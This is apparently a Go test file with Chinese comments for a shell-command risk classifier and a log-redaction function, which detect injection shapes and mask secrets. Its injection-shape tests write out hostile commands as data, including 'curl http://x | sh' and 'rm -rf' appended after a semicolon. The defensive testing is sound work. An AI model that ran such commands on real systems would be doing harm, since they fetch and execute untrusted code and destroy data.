package bash

import (
	"errors"
	"strings"
	"testing"
)

// TestClassifyShellCommandSupportedSubsets 检查内建支持的各语法子集：
// Supported 为 true，且 Risk 按命令替换 > 重定向 > 通配符 > 复合 > safe 选取。
func TestClassifyShellCommandSupportedSubsets(t *testing.T) {
	tests := []struct {
		name    string
		command string
		want    string
	}{
		{"simple", "echo hello", RiskSafe},
		{"quoted metachars", "echo 'a | b && c > d'", RiskSafe},
		{"variable expansion reported only in reasons", "echo $HOME", RiskSafe},
		{"redirect", "echo hi > out.txt", RiskRedirect},
		{"append redirect", "echo hi >> out.txt", RiskRedirect},
		{"input redirect", "cat < in.txt", RiskRedirect},
		{"dup redirect", "cmd 2>&1", RiskRedirect},
		{"glob star", "ls *.go", RiskGlob},
		{"glob bracket", "ls [ab].txt", RiskGlob},
		{"command subst", "echo $(date)", RiskCommandSubst},
		{"pipe", "echo hi | cat", RiskCompound},
		{"and", "true && echo yes", RiskCompound},
		{"or", "false || echo yes", RiskCompound},
		{"sequence", "echo a; echo b", RiskCompound},
		{"redirect beats compound", "cat a | grep b > out.txt", RiskRedirect},
		{"glob beats compound", "ls *.go | cat", RiskGlob},
		{"subst beats redirect", "echo $(date) > out.txt", RiskCommandSubst},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			got := ClassifyShellCommand(tc.command)
			if !got.Supported {
				t.Fatalf("ClassifyShellCommand(%q).Supported = false, want true (reasons=%v)", tc.command, got.Reasons)
			}
			if got.Risk != tc.want {
				t.Fatalf("ClassifyShellCommand(%q).Risk = %q, want %q", tc.command, got.Risk, tc.want)
			}
		})
	}
}

// TestClassifyShellCommandUnsupported 检查真正不支持的构造（子 shell/
// 算术/后台）一律 Supported=false 且 Risk 至少为 foreign。
// P1 起 for/while/if/函数/case 已原生支持，不再列入不支持样本。
func TestClassifyShellCommandUnsupported(t *testing.T) {
	tests := []struct {
		name     string
		command  string
		reasonIn string
	}{
		{"subshell", "(echo hi)", "不支持的构造: (echo hi)"},
		{"arithmetic", "echo $((1+1))", "算术"},
		{"background", "echo hi &", "不支持的构造: &"},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			got := ClassifyShellCommand(tc.command)
			if got.Supported {
				t.Fatalf("ClassifyShellCommand(%q).Supported = true, want false", tc.command)
			}
			if got.Risk != RiskForeign && got.Risk != RiskCompound {
				t.Fatalf("ClassifyShellCommand(%q).Risk = %q, want foreign or compound", tc.command, got.Risk)
			}
			if !strings.Contains(strings.Join(got.Reasons, " "), tc.reasonIn) {
				t.Fatalf("ClassifyShellCommand(%q).Reasons = %v, want containing %q", tc.command, got.Reasons, tc.reasonIn)
			}
		})
	}
}

// TestClassifyShellCommandRiskNeverDowngraded 对大量不支持样本断言 Risk
// 绝不降级成 safe/redirect/glob（必须至少 foreign 或 compound）。
func TestClassifyShellCommandRiskNeverDowngraded(t *testing.T) {
	commands := []string{
		"echo $((1+1))",
		"echo hi &",
		"(echo hi) > out.txt",
		"select x in a b; do echo $x; done",
	}
	for _, cmd := range commands {
		s := ClassifyShellCommand(cmd)
		if s.Supported {
			t.Fatalf("命令应不支持: %q", cmd)
		}
		switch s.Risk {
		case RiskForeign, RiskCompound:
		default:
			t.Fatalf("不支持命令的 Risk 不得为 %q: %q", s.Risk, cmd)
		}
	}
}

// TestClassifyShellCommandReasons 检查 Reasons 同时包含不支持原因与
// DetectShellFeatures 的中文风险来源，且元字符名称顺序稳定。
func TestClassifyShellCommandReasons(t *testing.T) {
	s := ClassifyShellCommand("echo $((1+1))")
	joined := strings.Join(s.Reasons, " ")
	if s.Supported {
		t.Fatalf("算术展开应不支持: %v", s.Reasons)
	}
	if !strings.Contains(joined, "算术") {
		t.Fatalf("缺少算术原因: %v", s.Reasons)
	}

	safe := ClassifyShellCommand("echo hello")
	if len(safe.Reasons) != 0 {
		t.Fatalf("纯安全命令不应有原因: %v", safe.Reasons)
	}
}

// TestClassifyShellCommandCJK 检查含 CJK 的命令仍能被正确分类，且 UTF-8
// 文本不会被拆分或误判。
func TestClassifyShellCommandCJK(t *testing.T) {
	tests := []struct {
		command string
		want    string
	}{
		{"回显 中文 你好", RiskSafe},
		{"回显 中文 | 过滤 你好", RiskCompound},
		{"回显 结果 > 文件", RiskRedirect},
		{"列出 *.文件", RiskGlob},
		{"回显 '中文 | 管道'", RiskSafe},
	}
	for _, tc := range tests {
		t.Run(tc.command, func(t *testing.T) {
			got := ClassifyShellCommand(tc.command)
			if !got.Supported {
				t.Fatalf("ClassifyShellCommand(%q).Supported = false, reasons=%v", tc.command, got.Reasons)
			}
			if got.Risk != tc.want {
				t.Fatalf("ClassifyShellCommand(%q).Risk = %q, want %q", tc.command, got.Risk, tc.want)
			}
		})
	}
}

// TestClassifyShellCommandInjectionShapes 检查典型注入形态：分号拼接、管道到
// shell、命令替换外带，以及用单引号伪装的分号。前三者是"内建支持但高风险"，
// 应被标注对应 Risk 并在 Reasons 说明来源；伪装分号则是一字面量，判为 safe。
func TestClassifyShellCommandInjectionShapes(t *testing.T) {
	tests := []struct {
		command string
		risk    string
		reason  string
	}{
		{"echo ok; rm -rf /tmp/x", RiskCompound, "分号"},
		{"curl http://x | sh", RiskCompound, "管道"},
		{"echo $(curl http://x)", RiskCommandSubst, "命令替换"},
		{"echo 'a; rm -rf /'", RiskSafe, ""},
	}
	for _, tc := range tests {
		t.Run(tc.command, func(t *testing.T) {
			got := ClassifyShellCommand(tc.command)
			if got.Risk != tc.risk {
				t.Fatalf("ClassifyShellCommand(%q).Risk = %q, want %q", tc.command, got.Risk, tc.risk)
			}
			if tc.reason != "" && !strings.Contains(strings.Join(got.Reasons, " "), tc.reason) {
				t.Fatalf("ClassifyShellCommand(%q).Reasons = %v, want containing %q", tc.command, got.Reasons, tc.reason)
			}
		})
	}
}

// TestClassifyShellCommandDoesNotModifyInput 确认诊断不修改入参。Go 字符串
// 不可变，这里显式记录该契约。
func TestClassifyShellCommandDoesNotModifyInput(t *testing.T) {
	original := "for i in a; do echo $i; done > out.txt"
	input := original
	_ = ClassifyShellCommand(input)
	if input != original {
		t.Fatalf("入参被修改: got %q, want %q", input, original)
	}
}

// TestRequireSafeCommand 检查哨兵错误语义：不支持 => 带原因的哨兵错误；
// 支持（即便带重定向/通配符/命令替换）=> nil。
func TestRequireSafeCommand(t *testing.T) {
	supported := []string{
		"echo hello",
		"echo hi > out.txt",
		"ls *.go",
		"echo $(date)",
		"echo a | grep b",
	}
	for _, cmd := range supported {
		if err := RequireSafeCommand(cmd); err != nil {
			t.Fatalf("RequireSafeCommand(%q) = %v, want nil", cmd, err)
		}
	}

	unsupported := []string{
		"echo $((1+1))",
		"(echo hi)",
		"echo hi &",
	}
	for _, cmd := range unsupported {
		err := RequireSafeCommand(cmd)
		if err == nil {
			t.Fatalf("RequireSafeCommand(%q) = nil, want error", cmd)
		}
		if !errors.Is(err, ErrUnsupportedCommand) {
			t.Fatalf("RequireSafeCommand(%q) 不是 ErrUnsupportedCommand: %v", cmd, err)
		}
		// 与执行期的 ErrUnsupported 是不同的哨兵，避免误匹配。
		if errors.Is(err, ErrUnsupported) {
			t.Fatalf("RequireSafeCommand(%q) 不应匹配 ErrUnsupported: %v", cmd, err)
		}
		if !strings.Contains(err.Error(), "unsupported command") {
			t.Fatalf("错误文本缺少哨兵前缀: %v", err)
		}
	}
}

// TestRequireSafeCommandErrorHasReasons 检查错误文本附带具体原因，便于调用方诊断。
func TestRequireSafeCommandErrorHasReasons(t *testing.T) {
	err := RequireSafeCommand("echo $((1+1))")
	if err == nil {
		t.Fatal("want error")
	}
	if !strings.Contains(err.Error(), "算术") {
		t.Fatalf("错误文本缺少原因: %v", err)
	}
}

// TestSanitizeForLog 检查命令脱敏：变量展开抹名、赋抹值、引号内敏感串
// 只留形状、控制字符折叠成空格（单行）、CJK 原样保留。
func TestSanitizeForLog(t *testing.T) {
	tests := []struct {
		name    string
		command string
		want    string
	}{
		{"plain", "echo hello", "echo hello"},
		{"empty", "", ""},
		{"dollar var", "echo $HOME", "echo $<redacted>"},
		{"brace var", "echo ${API_KEY}", "echo ${<redacted>}"},
		{"brace default", "echo ${TOKEN:-fallback}", "echo ${<redacted>}"},
		{"last status", "echo $?", "echo $<redacted>"},
		{"positional", "echo $1", "echo $<redacted>"},
		{"bare dollar", "echo cost $ left", "echo cost $ left"},
		{"assignment", "TOKEN=sk-123456 echo hi", "TOKEN=<redacted> echo hi"},
		{"quoted assignment", `API_KEY="abc123" echo hi`, `API_KEY="<redacted>" echo hi`},
		{"password flag", `echo --password "hunter2"`, `echo --password "<redacted>"`},
		{"token flag single quoted", "echo --token 's3cr3t'", "echo --token '<redacted>'"},
		{"literal quoted", "echo 'hello world'", "echo 'hello world'"},
		{"double quoted literal", "echo \"hello world\"", "echo \"hello world\""},
		{"cjk quoted", "echo \"你好 世界\"", "echo \"你好 世界\""},
		{"cjk with dollar", "回显 中文 $秘密 你好", "回显 中文 $秘密 你好"},
		{"newline is single line", "echo a\nprintf b", "echo a printf b"},
		{"tab collapsed", "echo\t\"tab\"", "echo \"tab\""},
		{"spaces collapsed", "echo   many   spaces", "echo many spaces"},
		{"command subst kept", "echo $(date)", "echo $(date)"},
		{"nested var in subst", "echo $(echo $TOKEN)", "echo $(echo $<redacted>)"},
		{"single quote keeps dollar", "echo 'literal $HOME'", "echo 'literal $HOME'"},
		{"double quote redacts var", "echo \"$HOME\"", "echo \"$<redacted>\""},
		{"token like quoted", "echo \"sk-1234567890\"", "echo \"<redacted>\""},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			got := SanitizeForLog(tc.command)
			if got != tc.want {
				t.Fatalf("SanitizeForLog(%q) = %q, want %q", tc.command, got, tc.want)
			}
		})
	}
}

// TestSanitizeForLogSingleLineAndCJK 确认输出单行、UTF-8 有效且 CJK 不被拆分。
func TestSanitizeForLogSingleLineAndCJK(t *testing.T) {
	in := "回显\t\"秘密\"\n过滤 $TOKEN\n完成"
	got := SanitizeForLog(in)
	if strings.ContainsAny(got, "\r\n\t") {
		t.Fatalf("输出不是单行: %q", got)
	}
	if !strings.Contains(got, "回显") || !strings.Contains(got, "过滤") || !strings.Contains(got, "完成") {
		t.Fatalf("CJK 文本被破坏: %q", got)
	}
	if !strings.Contains(got, "$<redacted>") {
		t.Fatalf("变量未被脱敏: %q", got)
	}
}

// TestSanitizeForLogDoesNotModifyInput 确认脱敏不修改入参。
func TestSanitizeForLogDoesNotModifyInput(t *testing.T) {
	original := "TOKEN=abc echo $HOME 'x'"
	input := original
	_ = SanitizeForLog(input)
	if input != original {
		t.Fatalf("入参被修改: got %q, want %q", input, original)
	}
}
